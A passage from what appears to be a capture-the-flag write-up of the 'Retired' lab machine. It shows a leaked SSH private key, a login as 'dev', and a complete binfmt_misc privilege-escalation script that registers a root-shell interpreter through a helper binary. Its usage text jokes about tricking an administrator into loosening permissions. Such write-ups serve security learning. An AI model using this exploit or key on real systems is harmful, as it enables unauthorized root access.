Gyf8Sr5bqYjCnGw/u0R8rAkjOsZIAaCfq62kqWE4l7P74oZKeqTdozEWv3ngA0TVqMqlOy
1bCsIWf/wMSoyUrw0p2lHiA2imenuF2LDik119064e7vQY79mBQ/A0QxJgyOXfreiJsLPN
+9Gv+Wds+wu43wqcwwE3pNDSKi4t4xJiP/LyzvcSHJI2jVaKsPwVSjao3dNyiitmNHOQ0Q
KxZsJCXZmxscM8k1fKEGXY8NJlQRY23UNIokARBRjT/f86U//3sGqLGWEThOBR1zRCKtt2
d0sVDclHi6pCPDJX9DHAZr3P6MxkeQAAAAMBAAEAAAGAEOqioDubgvZBiLXphmzSUxiUpV
0gDrfJ8z8RoqE/nAdmylWaFET0olRA5z6niQKgPIczGsOuGsrrDpgFd84kd4DSywmPNkhQ
oF2DEXjbk5RJzJv0spcbRKTQc8OFZcMqCYHemkux79ArRVm/X6uT40O+ANMLMOg8YA47+G
EkxEj3n81Geb8GvrcPTlJxf5x0dl9sPt+hxSIkPjvUfKYV7mw9nEzebvYmXBhdHsF8lOty
TR76WaUWtUUJ2EExSD0Am3DQMq4sgLT9tb+rlU7DoHtoSPX6CfdInH9ciRnLG1kVbDaEaa
NT2anONVOswKJWVYgUN83cCCPyRzQJLPC6u7uSdhXU9sGuN34m5wQYp3wFiRnIdKgTcnI8
IoVRX0rnTtBUWeiduhdi2XbYh5OFFjh77tWCi9eTR7wopwUGR0u5sbDZYGPlOWNk22+Ncw
qQMIq0f4TBegkOUNV85gyEkIwifjgvfdw5FJ4zhoVbbevgo7IVz3gIYfDjktTF+n9dAAAA
wDyIzLbm4JWNgNhrc7Ey8wnDEUAQFrtdWMS/UyZY8lpwj0uVw8wdXiV8rFFPZezpyio9nr
xybImQU+QgCBdqQSavk4OJetk29fk7X7TWmKw5dwLuEDbJZo8X/MozmhgOR9nhMrBXR2g/
yJuCfKA0rcKby+3TSbl/uCk8hIPUDT+BNYyR5yBggI7+DKQBvHa8eTdvqGRnJ9jUnP6tfB
KCKW97HIfCpt5tzoKiJ7/eAuGEjjHN28GP1u4iVoD0udnUHQAAAMEA+RceJG5scCzciPd9
7zsHHTpQNhKQs13qfgQ9UGbyCit+eWzc/bplfm5ljfw+cFntZULdkhiFCIosHPLxmYe8r0
FZUzTqOeDCVK9AZjn8uy8VaFCWb4jvB+oZ3d+pjFKXIVWpl0ulnpOOoHHIoM7ghudXb0vF
L8+QpuPCuHrb2N9JVLxHrTyZh3+v9Pg/R6Za5RCCT36R+W6es8Exoc9itANuoLudiUtZif
84JIKNaGGi6HGdAqHaxBmEn7N/XDu7AAAAwQDuOLR38jHklS+pmYsXyLjOSPUlZI7EAGlC
xW5PH/X1MNBfBDyB+7qjFFx0tTsfVRboJvhiYtRbg/NgfBpnNH8LpswL0agdZyGw3Np4w8
aQSXt9vNnIW2hDwX9fIFGKaz58FYweCXzLwgRVGBfnpq2QSXB0iXtLCNkWbAS9DM3esjsA
1JCCYKFMrvXeeshyxnKmXix+3qeoh8TTQvr7ZathE5BQrYXvfRwZJQcgh8yv71pNT3Gpia
7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ=
-----END OPENSSH PRIVATE KEY-----
```

We can use this key to SSH in as `dev`:
```bash
caue@kali:~/htb/retired$ ssh -i dev.idrsa dev@10.10.11.154          
The authenticity of host 10.10.11.154 (10.10.11.154) cant be established.
ED25519 key fingerprint is SHA256:yJ9p3p5aZFrQR+J2qeIQ54gY9gQ7kcEbymYQBvP5PdY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.154' (ED25519) to the list of known hosts.
Linux retired 5.10.0-11-amd64 #1 SMP Debian 5.10.92-2 (2022-02-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Mar 28 11:36:17 2022 from 10.10.14.23
dev@retired:~$
```

## Privilege escalation 2
As we SSH in as `dev` we see some interesting files and fodlers in the home directory:
```bash
dev@retired:~$ ls -la
total 40
drwx------ 6 dev  dev  4096 Mar 11 14:36 .
drwxr-xr-x 3 root root 4096 Mar 11 14:36 ..
lrwxrwxrwx 1 root root    9 Oct 13  2021 .bash_history -> /dev/null
-rw------- 1 dev  dev   220 Aug  4  2021 .bash_logout
-rw------- 1 dev  dev  3526 Aug  4  2021 .bashrc
drwxr-xr-x 3 dev  dev  4096 Mar 11 14:36 .local
-rw------- 1 dev  dev   807 Aug  4  2021 .profile
drwx------ 2 dev  dev  4096 Mar 11 14:36 .ssh
drwx------ 2 dev  dev  4096 Mar 11 14:36 activate_license
drwx------ 3 dev  dev  4096 Mar 11 14:36 emuemu
-rw-r----- 1 root dev    33 Apr 29 04:03 user.txt
```

The emuemu directory:
```
dev@retired:~/emuemu$ ls -la
total 68
drwx------ 3 dev dev  4096 Mar 11 14:36 .
drwx------ 6 dev dev  4096 Mar 11 14:36 ..
-rw------- 1 dev dev   673 Oct 13  2021 Makefile
-rw------- 1 dev dev   228 Oct 13  2021 README.md
-rw------- 1 dev dev 16608 Oct 13  2021 emuemu
-rw------- 1 dev dev   168 Oct 13  2021 emuemu.c
-rw------- 1 dev dev 16864 Oct 13  2021 reg_helper
-rw------- 1 dev dev   502 Oct 13  2021 reg_helper.c
drwx------ 2 dev dev  4096 Mar 11 14:36 test
```

The `emuemu` binary is also found at `/usr/lib/emuemu/`:
```
dev@retired:~$ ls -la /usr/lib/emuemu/
total 28
drwxr-xr-x  2 root root  4096 Mar 11 14:36 .
drwxr-xr-x 54 root root  4096 Mar 28 11:12 ..
-rwxr-x---  1 root dev  16864 Oct 13 02:59 reg_helper
```

We can read the source-code, not very interesting though:
```c emuemu.c
#include <stdio.h>

/* currently this is only a dummy implementation doing nothing */

int main(void) {
    puts("EMUEMU is still under development.");
    return 1;
}
```

We also see a `reg_helper` binary there and we can have a look at the source-code. The interesting part here is that this file is owned by `root`!  `/home/dev/emuemu/reg_helper.c`:
```c reg_helper.c
#define _GNU_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
    char cmd[512] = { 0 };

    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;

    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
    if (-1 == fd)
        perror("open");
    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
        perror("write");
    if (close(fd) == -1)
        perror("close");

    return 0;
}
```

It seems that the `reg_helper` is using `/proc/sys/fs/binfmt_misc/register` to run some commands. At first I didn't know much about `binfmt_misc` so I did a bit of research and learn the basics of usage.

Based on Wikipedia, **binfmt_misc** (_Miscellaneous Binary Format_) is a capability of the [Linux kernel](https://en.wikipedia.org/wiki/Linux_kernel "Linux kernel") which allows arbitrary [executable file formats](https://en.wikipedia.org/wiki/Executable_file_format "Executable file format") to be recognized and passed to certain [user space](https://en.wikipedia.org/wiki/User_space "User space") applications, such as [emulators](https://en.wikipedia.org/wiki/Emulator "Emulator") and [virtual machines](https://en.wikipedia.org/wiki/Virtual_machine "Virtual machine").It is one of a number of binary format handlers in the kernel that are involved in preparing a user-space program to run.

We can check how EMUEMU is used:
```bash
dev@retired:~$ cat /proc/sys/fs/binfmt_misc/EMUEMU 
enabled
interpreter /usr/bin/emuemu
flags: 
offset 0
magic 13374f53545249434800524f4d00
```

So files that starts with that "magic" signature will be interpreted by `/usr/bin/emuemu`.

### Road to root
During my research I found [this github repository](https://github.com/toffan/binfmt_misc/blob/master/binfmt_rootkit) which is a POC to exploit this functionality.
We can make a copy of that and do some modifications to make it work for us.
Modify the last line:
```bash
# Original
echo "$binfmt_line" > "$mountpoint"/register

# Modified
echo "$binfmt_line" | /usr/lib/emuemu/reg_helper
```

Final exploit:
```bash
#!/bin/bash

readonly searchsuid="/bin/"
readonly mountpoint="/proc/sys/fs/binfmt_misc"
readonly exe="$0"


warn()
{
    1>&2 echo $@
}

die()
{
    warn $@
    exit -1
}

usage()
{
    cat 1>&2 <<EOF
Usage: $exe
    Gives you a root shell if /proc/sys/fs/binfmt_misc/register is writeable,
    note that it must be enforced by any other mean before your try this, for
    example by typing something like "sudo chmod +6 /*/*/f*/*/*r" while Dave is
    thinking that you are fixing his problem.
EOF
    exit 1
}

function pick_suid()
{
	find "$1" -perm -4000 -executable \
	    | tail -n 1
}

function read_magic()
{
    [[ -e "$1" ]] && \
    [[ "$2" =~ [[:digit:]]+ ]] && \
    dd if="$1" bs=1 count="$2" status=none \
        | sed -e 's-\x00-\\x00-g'
}

[[ -n "$1" ]] && usage

target="$(pick_suid "$searchsuid")"
test -e "$target" || die "Error: Unable to find a suid binary in $searchsuid"

binfmt_magic="$(read_magic "$target" "126")"
test -z "$binfmt_magic" && die "Error: Unable to retrieve a magic for $target"

fmtname="$(mktemp -u XXXX)"
fmtinterpr="$(mktemp)"

gcc -o "$fmtinterpr" -xc - <<- __EOF__
	#include <stdlib.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <pwd.h>

	int main(int argc, char *argv[])
	{
		// remove our temporary file
		unlink("$fmtinterpr");

		// remove the unused binary format
		FILE* fmt = fopen("$mountpoint/$fmtname", "w");
		fprintf(fmt, "-1\\n");
		fclose(fmt);

		// MOTD
		setuid(0);
		uid_t uid = getuid();
		uid_t euid = geteuid();
		struct passwd *pw = getpwuid(uid);
		struct passwd *epw = getpwuid(euid);
		fprintf(stderr, "uid=%u(%s) euid=%u(%s)\\n",
			uid,
			pw->pw_name,
			euid,
			epw->pw_name);

		// welcome home
		char* sh[] = {"/bin/sh", (char*) 0};
		execvp(sh[0], sh);
		return 1;
	}
__EOF__

chmod a+x "$fmtinterpr"

binfmt_line="_${fmtname}_M__${binfmt_magic}__${fmtinterpr}_OC"
echo "$binfmt_line" | /usr/lib/emuemu/reg_helper

exec "$target"
```

And we are root!
```
# id
uid=0(root) gid=1001(dev) groups=1001(dev),33(www-data)
# ls -la /root
total 28
drwx------  3 root root 4096 Mar 11 14:36 .
drwxr-xr-x 18 root root 4096 Mar 11 14:52 ..
lrwxrwxrwx  1 root root    9 Oct 13  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Mar 11 14:36 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rwxr-xr-x  1 root root  135 Mar 11 13:22 cleanup.sh
-rw-r-----  1 root root   33 Apr 29 04:03 root.txt
```